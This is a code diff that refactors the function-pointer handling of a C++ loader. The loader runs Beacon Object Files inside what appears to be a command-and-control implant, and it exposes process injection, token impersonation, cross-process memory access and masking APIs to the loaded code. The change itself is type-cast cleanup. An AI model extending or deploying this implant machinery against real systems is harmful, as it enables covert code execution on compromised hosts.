@@ -8,7 +8,9 @@
 #include <vector>
 #include <string>
 
+#ifdef _MSC_VER
 #pragma comment(lib, "advapi32.lib")
+#endif
 
 static const int CALLBACK_OUTPUT             = 0x00;
 static const int CALLBACK_ERROR              = 0x0d;
@@ -29,14 +31,26 @@ static void* gValueStoreKeys[64] = {};
 static void* gValueStoreValues[64] = {};
 static HANDLE gStopJobEvent = NULL;
 
-static ULONG Djb2A(const char* str)
+template <typename T>
+static ULONG_PTR ProcAddress(T proc)
 {
-    ULONG hash = 5381;
-    int c = 0;
-    while ((c = *str++) != 0) {
-        hash = ((hash << 5) + hash) + (unsigned char)c;
-    }
-    return hash;
+    union {
+        T typed;
+        ULONG_PTR raw;
+    } caster = {};
+    caster.typed = proc;
+    return caster.raw;
+}
+
+template <typename T>
+static T ProcFromAddress(ULONG_PTR address)
+{
+    union {
+        ULONG_PTR raw;
+        T typed;
+    } caster = {};
+    caster.raw = address;
+    return caster.typed;
 }
 
 static int BofAddMessageRaw(BofContext* ctx, int type, const BYTE* data, int dataLen)
@@ -127,81 +141,81 @@ static void TrimLeadingUnderscores(const char** value)
     }
 }
 
-static FARPROC ResolveExternalSymbol(const char* symbolName)
+static ULONG_PTR ResolveExternalSymbol(const char* symbolName)
 {
     if (!symbolName || !*symbolName) {
-        return NULL;
+        return 0;
     }
 
     struct ApiEntry {
         const char* name;
-        FARPROC proc;
+        ULONG_PTR proc;
     };
 
     static const ApiEntry apiTable[] = {
-        { "BeaconDataParse", (FARPROC)BeaconDataParse },
-        { "BeaconDataInt", (FARPROC)BeaconDataInt },
-        { "BeaconDataShort", (FARPROC)BeaconDataShort },
-        { "BeaconDataLength", (FARPROC)BeaconDataLength },
-        { "BeaconDataExtract", (FARPROC)BeaconDataExtract },
-        { "BeaconDataPtr", (FARPROC)BeaconDataPtr },
-        { "BeaconOutput", (FARPROC)BeaconOutput },
-        { "BeaconPrintf", (FARPROC)BeaconPrintf },
-        { "BeaconFormatAlloc", (FARPROC)BeaconFormatAlloc },
-        { "BeaconFormatReset", (FARPROC)BeaconFormatReset },
-        { "BeaconFormatAppend", (FARPROC)BeaconFormatAppend },
-        { "BeaconFormatPrintf", (FARPROC)BeaconFormatPrintf },
-        { "BeaconFormatToString", (FARPROC)BeaconFormatToString },
-        { "BeaconFormatFree", (FARPROC)BeaconFormatFree },
-        { "BeaconFormatInt", (FARPROC)BeaconFormatInt },
-        { "BeaconUseToken", (FARPROC)BeaconUseToken },
-        { "BeaconRevertToken", (FARPROC)BeaconRevertToken },
-        { "BeaconIsAdmin", (FARPROC)BeaconIsAdmin },
-        { "toWideChar", (FARPROC)toWideChar },
-        { "BeaconAddValue", (FARPROC)BeaconAddValue },
-        { "BeaconGetValue", (FARPROC)BeaconGetValue },
-        { "BeaconRemoveValue", (FARPROC)BeaconRemoveValue },
-        { "BeaconGetSpawnTo", (FARPROC)BeaconGetSpawnTo },
-        { "BeaconSpawnTemporaryProcess", (FARPROC)BeaconSpawnTemporaryProcess },
-        { "BeaconInjectProcess", (FARPROC)BeaconInjectProcess },
-        { "BeaconInjectTemporaryProcess", (FARPROC)BeaconInjectTemporaryProcess },
-        { "BeaconCleanupProcess", (FARPROC)BeaconCleanupProcess },
-        { "BeaconVirtualAlloc", (FARPROC)BeaconVirtualAlloc },
-        { "BeaconVirtualAllocEx", (FARPROC)BeaconVirtualAllocEx },
-        { "BeaconVirtualProtect", (FARPROC)BeaconVirtualProtect },
-        { "BeaconVirtualProtectEx", (FARPROC)BeaconVirtualProtectEx },
-        { "BeaconVirtualFree", (FARPROC)BeaconVirtualFree },
-        { "BeaconGetThreadContext", (FARPROC)BeaconGetThreadContext },
-        { "BeaconSetThreadContext", (FARPROC)BeaconSetThreadContext },
-        { "BeaconResumeThread", (FARPROC)BeaconResumeThread },
-        { "BeaconOpenProcess", (FARPROC)BeaconOpenProcess },
-        { "BeaconOpenThread", (FARPROC)BeaconOpenThread },
-        { "BeaconCloseHandle", (FARPROC)BeaconCloseHandle },
-        { "BeaconUnmapViewOfFile", (FARPROC)BeaconUnmapViewOfFile },
-        { "BeaconVirtualQuery", (FARPROC)BeaconVirtualQuery },
-        { "BeaconDuplicateHandle", (FARPROC)BeaconDuplicateHandle },
-        { "BeaconReadProcessMemory", (FARPROC)BeaconReadProcessMemory },
-        { "BeaconWriteProcessMemory", (FARPROC)BeaconWriteProcessMemory },
-        { "BeaconInformation", (FARPROC)BeaconInformation },
-        { "BeaconGetOutputData", (FARPROC)BeaconGetOutputData },
-        { "BeaconDownload", (FARPROC)BeaconDownload },
-        { "BeaconGetSyscallInformation", (FARPROC)BeaconGetSyscallInformation },
-        { "swap_endianess", (FARPROC)swap_endianess },
-        { "BeaconDataStoreGetItem", (FARPROC)BeaconDataStoreGetItem },
-        { "BeaconDataStoreProtectItem", (FARPROC)BeaconDataStoreProtectItem },
-        { "BeaconDataStoreUnprotectItem", (FARPROC)BeaconDataStoreUnprotectItem },
-        { "BeaconDataStoreMaxEntries", (FARPROC)BeaconDataStoreMaxEntries },
-        { "BeaconGetCustomUserData", (FARPROC)BeaconGetCustomUserData },
-        { "BeaconDisableBeaconGate", (FARPROC)BeaconDisableBeaconGate },
-        { "BeaconEnableBeaconGate", (FARPROC)BeaconEnableBeaconGate },
-        { "BeaconDisableBeaconGateMasking", (FARPROC)BeaconDisableBeaconGateMasking },
-        { "BeaconEnableBeaconGateMasking", (FARPROC)BeaconEnableBeaconGateMasking },
-        { "AxAddScreenshot", (FARPROC)AxAddScreenshot },
-        { "AxDownloadMemory", (FARPROC)AxDownloadMemory },
-        { "BeaconRegisterThreadCallback", (FARPROC)BeaconRegisterThreadCallback },
-        { "BeaconUnregisterThreadCallback", (FARPROC)BeaconUnregisterThreadCallback },
-        { "BeaconWakeup", (FARPROC)BeaconWakeup },
-        { "BeaconGetStopJobEvent", (FARPROC)BeaconGetStopJobEvent },
+        { "BeaconDataParse", ProcAddress(&BeaconDataParse) },
+        { "BeaconDataInt", ProcAddress(&BeaconDataInt) },
+        { "BeaconDataShort", ProcAddress(&BeaconDataShort) },
+        { "BeaconDataLength", ProcAddress(&BeaconDataLength) },
+        { "BeaconDataExtract", ProcAddress(&BeaconDataExtract) },
+        { "BeaconDataPtr", ProcAddress(&BeaconDataPtr) },
+        { "BeaconOutput", ProcAddress(&BeaconOutput) },
+        { "BeaconPrintf", ProcAddress(&BeaconPrintf) },
+        { "BeaconFormatAlloc", ProcAddress(&BeaconFormatAlloc) },
+        { "BeaconFormatReset", ProcAddress(&BeaconFormatReset) },
+        { "BeaconFormatAppend", ProcAddress(&BeaconFormatAppend) },
+        { "BeaconFormatPrintf", ProcAddress(&BeaconFormatPrintf) },
+        { "BeaconFormatToString", ProcAddress(&BeaconFormatToString) },
+        { "BeaconFormatFree", ProcAddress(&BeaconFormatFree) },
+        { "BeaconFormatInt", ProcAddress(&BeaconFormatInt) },
+        { "BeaconUseToken", ProcAddress(&BeaconUseToken) },
+        { "BeaconRevertToken", ProcAddress(&BeaconRevertToken) },
+        { "BeaconIsAdmin", ProcAddress(&BeaconIsAdmin) },
+        { "toWideChar", ProcAddress(&toWideChar) },
+        { "BeaconAddValue", ProcAddress(&BeaconAddValue) },
+        { "BeaconGetValue", ProcAddress(&BeaconGetValue) },
+        { "BeaconRemoveValue", ProcAddress(&BeaconRemoveValue) },
+        { "BeaconGetSpawnTo", ProcAddress(&BeaconGetSpawnTo) },
+        { "BeaconSpawnTemporaryProcess", ProcAddress(&BeaconSpawnTemporaryProcess) },
+        { "BeaconInjectProcess", ProcAddress(&BeaconInjectProcess) },
+        { "BeaconInjectTemporaryProcess", ProcAddress(&BeaconInjectTemporaryProcess) },
+        { "BeaconCleanupProcess", ProcAddress(&BeaconCleanupProcess) },
+        { "BeaconVirtualAlloc", ProcAddress(&BeaconVirtualAlloc) },
+        { "BeaconVirtualAllocEx", ProcAddress(&BeaconVirtualAllocEx) },
+        { "BeaconVirtualProtect", ProcAddress(&BeaconVirtualProtect) },
+        { "BeaconVirtualProtectEx", ProcAddress(&BeaconVirtualProtectEx) },
+        { "BeaconVirtualFree", ProcAddress(&BeaconVirtualFree) },
+        { "BeaconGetThreadContext", ProcAddress(&BeaconGetThreadContext) },
+        { "BeaconSetThreadContext", ProcAddress(&BeaconSetThreadContext) },
+        { "BeaconResumeThread", ProcAddress(&BeaconResumeThread) },
+        { "BeaconOpenProcess", ProcAddress(&BeaconOpenProcess) },
+        { "BeaconOpenThread", ProcAddress(&BeaconOpenThread) },
+        { "BeaconCloseHandle", ProcAddress(&BeaconCloseHandle) },
+        { "BeaconUnmapViewOfFile", ProcAddress(&BeaconUnmapViewOfFile) },
+        { "BeaconVirtualQuery", ProcAddress(&BeaconVirtualQuery) },
+        { "BeaconDuplicateHandle", ProcAddress(&BeaconDuplicateHandle) },
+        { "BeaconReadProcessMemory", ProcAddress(&BeaconReadProcessMemory) },
+        { "BeaconWriteProcessMemory", ProcAddress(&BeaconWriteProcessMemory) },
+        { "BeaconInformation", ProcAddress(&BeaconInformation) },
+        { "BeaconGetOutputData", ProcAddress(&BeaconGetOutputData) },
+        { "BeaconDownload", ProcAddress(&BeaconDownload) },
+        { "BeaconGetSyscallInformation", ProcAddress(&BeaconGetSyscallInformation) },
+        { "swap_endianess", ProcAddress(&swap_endianess) },
+        { "BeaconDataStoreGetItem", ProcAddress(&BeaconDataStoreGetItem) },
+        { "BeaconDataStoreProtectItem", ProcAddress(&BeaconDataStoreProtectItem) },
+        { "BeaconDataStoreUnprotectItem", ProcAddress(&BeaconDataStoreUnprotectItem) },
+        { "BeaconDataStoreMaxEntries", ProcAddress(&BeaconDataStoreMaxEntries) },
+        { "BeaconGetCustomUserData", ProcAddress(&BeaconGetCustomUserData) },
+        { "BeaconDisableBeaconGate", ProcAddress(&BeaconDisableBeaconGate) },
+        { "BeaconEnableBeaconGate", ProcAddress(&BeaconEnableBeaconGate) },
+        { "BeaconDisableBeaconGateMasking", ProcAddress(&BeaconDisableBeaconGateMasking) },
+        { "BeaconEnableBeaconGateMasking", ProcAddress(&BeaconEnableBeaconGateMasking) },
+        { "AxAddScreenshot", ProcAddress(&AxAddScreenshot) },
+        { "AxDownloadMemory", ProcAddress(&AxDownloadMemory) },
+        { "BeaconRegisterThreadCallback", ProcAddress(&BeaconRegisterThreadCallback) },
+        { "BeaconUnregisterThreadCallback", ProcAddress(&BeaconUnregisterThreadCallback) },
+        { "BeaconWakeup", ProcAddress(&BeaconWakeup) },
+        { "BeaconGetStopJobEvent", ProcAddress(&BeaconGetStopJobEvent) },
     };
 
     const char* cursor = symbolName;
@@ -228,7 +242,7 @@ static FARPROC ResolveExternalSymbol(const char* symbolName)
     }
 
     if (moduleName.empty() || functionName.empty()) {
-        return NULL;
+        return 0;
     }
 
     if (moduleName.find('.') == std::string::npos) {
@@ -237,13 +251,13 @@ static FARPROC ResolveExternalSymbol(const char* symbolName)
 
     HMODULE library = LoadLibraryA(moduleName.c_str());
     if (!library) {
-        return NULL;
+        return 0;
     }
 
     if (!functionName.empty() && functionName[0] == '#') {
-        return GetProcAddress(library, (LPCSTR)(ULONG_PTR)atoi(functionName.c_str() + 1));
+        return (ULONG_PTR)GetProcAddress(library, (LPCSTR)(ULONG_PTR)atoi(functionName.c_str() + 1));
     }
-    return GetProcAddress(library, functionName.c_str());
+    return (ULONG_PTR)GetProcAddress(library, functionName.c_str());
 }
 
 static int ApplyRelocations(
@@ -283,14 +297,14 @@ static int ApplyRelocations(
                 resolved = (ULONG_PTR)(mappedSections[sectionIndex] + symbol->Value);
             } else {
                 char* symbolName = SymbolName(symbol, stringTable);
-                FARPROC proc = ResolveExternalSymbol(symbolName);
+                ULONG_PTR proc = ResolveExternalSymbol(symbolName);
                 if (!proc) {
                     std::string message = "BOF unresolved symbol: ";
                     message += symbolName ? symbolName : "<null>";
                     BofAddMessageText(ctx, BOF_ERROR_SYMBOL, message.c_str());
                     return 0;
                 }
-                resolved = (ULONG_PTR)proc;
+                resolved = proc;
             }
 
             switch (relocation->Type) {
@@ -331,15 +345,14 @@ static int ApplyRelocations(
     return 1;
 }
 
-static FARPROC FindEntryPoint(
-    unsigned char* coffFile,
+static ULONG_PTR FindEntryPoint(
     COF_HEADER* header,
     COF_SYMBOL* symbols,
     char* stringTable,
     unsigned char** mappedSections,
     const char* entryName)
 {
-    for (int i = 0; i < header->NumberOfSymbols; ++i) {
+    for (uint32_t i = 0; i < header->NumberOfSymbols; ++i) {
         COF_SYMBOL* symbol = &symbols[i];
         char* name = SymbolName(symbol, stringTable);
         if (!name || symbol->SectionNumber <= 0) {
@@ -352,14 +365,14 @@ static FARPROC FindEntryPoint(
         if (_stricmp(normalized, entryName) == 0) {
             int sectionIndex = symbol->SectionNumber - 1;
             if (sectionIndex >= 0 && sectionIndex < header->NumberOfSections && mappedSections[sectionIndex]) {
-                return (FARPROC)(mappedSections[sectionIndex] + symbol->Value);
+                return (ULONG_PTR)(mappedSections[sectionIndex] + symbol->Value);
             }
         }
 
         i += symbol->NumberOfAuxSymbols;
     }
 
-    return NULL;
+    return 0;
 }
 
 BofContext* ObjectExecute(
@@ -393,7 +406,7 @@ BofContext* ObjectExecute(
     COF_SECTION* sections = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + header->SizeOfOptionalHeader);
     COF_SYMBOL* symbols = (COF_SYMBOL*)(coffFile + header->PointerToSymbolTable);
     char* stringTable = (char*)(symbols + header->NumberOfSymbols);
-    FARPROC entry = NULL;
+    ULONG_PTR entry = 0;
 
     unsigned char* mappedSections[MAX_BOF_SECTIONS] = {};
     DWORD oldProtect[MAX_BOF_SECTIONS] = {};
@@ -427,7 +440,7 @@ BofContext* ObjectExecute(
         goto cleanup;
     }
 
-    entry = FindEntryPoint(coffFile, header, symbols, stringTable, mappedSections, "go");
+    entry = FindEntryPoint(header, symbols, stringTable, mappedSections, "go");
     if (!entry) {
         BofAddMessageText(ctx, BOF_ERROR_ENTRY, "BOF entry point 'go' was not found");
         goto cleanup;
@@ -444,7 +457,7 @@ BofContext* ObjectExecute(
 
     gCurrentContext = ctx;
     typedef void (*BofEntry)(char*, int);
-    ((BofEntry)entry)((char*)args, argsSize);
+    ProcFromAddress<BofEntry>(entry)((char*)args, argsSize);
     gCurrentContext = NULL;
 
 cleanup:
